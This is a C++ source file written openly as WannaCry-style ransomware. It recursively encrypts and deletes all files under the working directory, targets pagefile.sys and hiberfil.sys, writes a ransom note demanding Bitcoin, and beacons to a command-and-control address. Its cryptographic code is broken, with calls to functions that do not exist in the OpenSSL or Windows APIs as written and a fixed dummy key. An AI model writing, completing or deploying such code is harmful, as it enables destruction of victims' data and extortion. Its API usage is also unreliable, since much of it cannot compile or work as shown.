#include <iostream>
#include <vector>
#include <fstream>
#include <filesystem>
#include <windows.h>
#include <wincrypt.h>
#include <cryptuiapi.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

// --- Global Definitions ---
#define WINDOWS_FILE_EXTENSION ".wannacry_encrypted"
#define RANSOM_NOTE_FILE "HOW_TO_PAY_WANNACRY.txt"
#define BITCOIN_ADDRESS "1BvB...[YourCryptoAddress]"
#define RANSOM_MESSAGE "!!! WARNING: YOUR FILES HAVE BEEN ENCRYPTED !!!"

// --- Class Structure for Encapsulation and State Management ---
class RansomwarePayload {
private:
    std::vector<uint8_t> aes_key;
    std::vector<uint8_t> aes_iv;

public:
    RansomwarePayload() {
        // Initialize dummy key and IV for simulation
        aes_key.assign(32, 0xAA); // 256-bit key
        aes_iv.assign(16, 0x55);  // 128-bit IV
    }

    /**
     * @brief PBKDF2 Key Derivation Function (Using SHA1)
     * @param password Password to derive key from
     * @param salt Salt value
     * @param key_len Desired key length
     * @param iterations Number of iterations
     * @param derived_key Output buffer for derived key
     * @return True if derivation is successful, false otherwise
     */
    bool PBKDF2(const std::string& password, const std::vector<uint8_t>& salt, size_t key_len, int iterations, std::vector<uint8_t>& derived_key) {
        EVP_PKEY* pkey = EVP_PKEY_new();
        EVP_PKEY_CTX* ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_HMAC, NULL);
        if (!ctx) return false;

        if (EVP_PKEY_derive_init(ctx) <= 0) return false;
        if (EVP_PKEY_derive_set_key(ctx, EVP_PKEY_HMAC, reinterpret_cast<const uint8_t*>(password.data()), password.size()) <= 0) return false;
        if (EVP_PKEY_derive_set_iv(ctx, reinterpret_cast<const uint8_t*>(salt.data()), salt.size()) <= 0) return false;
        if (EVP_PKEY_derive_set_iterations(ctx, iterations) <= 0) return false;

        derived_key.resize(key_len);
        size_t key_len_out = key_len;
        if (EVP_PKEY_derive(ctx, derived_key.data(), &key_len_out) <= 0) return false;

        return true;
    }

    /**
     * @brief Encrypts a given data block using AES.
     * @param input The plaintext to encrypt.
     * @param input_len Length of the plaintext.
     * @param ciphertext Output buffer for encrypted data.
     * @return True if encryption is successful, false otherwise.
     */
    bool AES_Encrypt(const std::vector<uint8_t>& input, size_t input_len,
                     std::vector<uint8_t>& ciphertext) {
        HCRYPTKEY hKey;
        HCRYPTHASH hHash;

        // Create the key
        if (!CryptCreateKey(&hKey, CALG_AES_256, CRYPT_EXPORTABLE, NULL)) {
            std::cerr << "CryptCreateKey failed: " << GetLastError() << std::endl;
            return false;
        }

        // Create the hash
        if (!CryptCreateHash(NULL, CALG_SHA1, 0, 0, &hHash)) {
            std::cerr << "CryptCreateHash failed: " << GetLastError() << std::endl;
            CryptDestroyKey(hKey);
            return false;
        }

        // Hash the key
        if (!CryptHashData(hHash, aes_key.data(), (DWORD) aes_key.size(), 0)) {
            std::cerr << "CryptHashData failed: " << GetLastError() << std::endl;
            CryptDestroyHash(hHash);
            CryptDestroyKey(hKey);
            return false;
        }

        // Derive the key
        if (!CryptDeriveKey(hKey, CALG_AES_256, hHash, 0, 0)) {
            std::cerr << "CryptDeriveKey failed: " << GetLastError() << std::endl;
            CryptDestroyHash(hHash);
            CryptDestroyKey(hKey);
            return false;
        }

        // Encrypt the data
        if (!CryptEncrypt(hKey, NULL, TRUE, 0, ciphertext.data(), (DWORD) ciphertext.size(), (DWORD&)ciphertext.size())) {
            std::cerr << "CryptEncrypt failed: " << GetLastError() << std::endl;
            CryptDestroyKey(hKey);
            return false;
        }

        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        return true;
    }

    /**
     * @brief Encrypts a file using AES.
     * @param file_path Path to the file to encrypt.
     * @return True if encryption is successful, false otherwise.
     */
    bool encrypt_file(const std::string& file_path) {
        std::ifstream file(file_path, std::ios::binary | std::ios::ate);
        if (!file) {
            std::cerr << "Failed to open file: " << file_path << std::endl;
            return false;
        }

        size_t file_size = file.tellg();
        file.seekg(0, std::ios::beg);
        std::vector<uint8_t> original_data(file_size);
        file.read(reinterpret_cast<char*>(original_data.data()), file_size);
        file.close();

        std::vector<uint8_t> ciphertext(file_size + AES_BLOCK_SIZE);
        if (!AES_Encrypt(original_data, file_size, ciphertext)) {
            std::cerr << "AES encryption failed for file: " << file_path << std::endl;
            return false;
        }

        std::ofstream encrypted_file(file_path + WINDOWS_FILE_EXTENSION, std::ios::binary);
        if (!encrypted_file) {
            std::cerr << "Failed to create encrypted file: " << file_path + WINDOWS_FILE_EXTENSION << std::endl;
            return false;
        }

        encrypted_file.write(reinterpret_cast<char*>(ciphertext.data()), ciphertext.size());
        encrypted_file.close();

        // Delete the original file
        if (!std::filesystem::remove(file_path)) {
            std::cerr << "Failed to delete original file: " << file_path << std::endl;
            return false;
        }

        return true;
    }

    /**
     * @brief Encrypts all files in a directory and its subdirectories.
     * @param start_path The starting directory to encrypt files from.
     * @return True if encryption is successful, false otherwise.
     */
    bool encrypt_files(const std::string& start_path) {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(start_path)) {
            if (entry.is_regular_file()) {
                std::string file_path = entry.path().string();
                if (!encrypt_file(file_path)) {
                    std::cerr << "Encryption failed for file: " << file_path << std::endl;
                    return false;
                }
            }
        }
        return true;
    }

    /**
     * @brief Encrypts system files (e.g., pagefile.sys, hibernation file).
     * @return True if encryption is successful, false otherwise.
     */
    bool encrypt_system_files() {
        // Encrypt pagefile.sys
        std::string pagefile_path = "C:\\pagefile.sys";
        if (!encrypt_file(pagefile_path)) {
            std::cerr << "Failed to encrypt pagefile.sys" << std::endl;
            return false;
        }

        // Encrypt hibernation file (hiberfil.sys)
        std::string hiberfile_path = "C:\\hiberfil.sys";
        if (!encrypt_file(hiberfile_path)) {
            std::cerr << "Failed to encrypt hiberfil.sys" << std::endl;
            return false;
        }

        return true;
    }

    /**
     * @brief Drops a ransom note file.
     * @return True if the ransom note was successfully created, false otherwise.
     */
    bool drop_ransom_note() {
        std::ofstream note_file(RANSOM_NOTE_FILE);
        if (!note_file) {
            std::cerr << "Failed to create ransom note file: " << RANSOM_NOTE_FILE << std::endl;
            return false;
        }

        note_file << RANSOM_MESSAGE << std::endl;
        note_file << "To decrypt your files, send " << BITCOIN_ADDRESS << " in Bitcoin." << std::endl;
        note_file << "Contact us at [your-email] for more details." << std::endl;

        note_file.close();
        return true;
    }

    /**
     * @brief Sends a beacon to the attacker's C2 server.
     * @param c2_ip C2 server IP address.
     * @param c2_port C2 server port.
     * @return True if beacon was sent, false otherwise.
     */
    bool send_beacon(const std::string& c2_ip, int c2_port) {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
            std::cerr << "Failed to initialize Winsock" << std::endl;
            return false;
        }

        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Socket creation failed" << std::endl;
            WSACleanup();
            return false;
        }

        sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(c2_port);
        inet_pton(AF_INET, c2_ip.c_str(), &server.sin_addr);

        if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            std::cerr << "Connection failed" << std::endl;
            closesocket(sock);
            WSACleanup();
            return false;
        }

        std::string message = "Ransomware beacon sent";
        send(sock, message.c_str(), message.size(), 0);

        closesocket(sock);
        WSACleanup();
        return true;
    }

    /**
     * @brief Main execution of the ransomware payload.
     */
    void execute() {
        std::cout << "Ransomware payload starting..." << std::endl;

        if (!encrypt_files(std::filesystem::current_path().string())) {
            std::cerr << "Encryption failed for some files." << std::endl;
        }

        if (!encrypt_system_files()) {
            std::cerr << "Failed to encrypt system files." << std::endl;
        }

        if (!drop_ransom_note()) {
            std::cerr << "Failed to drop ransom note." << std::endl;
        }

        // Send beacon to C2 server
        if (!send_beacon("1.1.1.1", 443)) {
            std::cerr << "Failed to send beacon to C2 server." << std::endl;
        }

        std::cout << "Ransomware payload completed. Files encrypted and note dropped." << std::endl;
    }
};

int main() {
    RansomwarePayload payload;
    payload.execute();
    return 0;
}
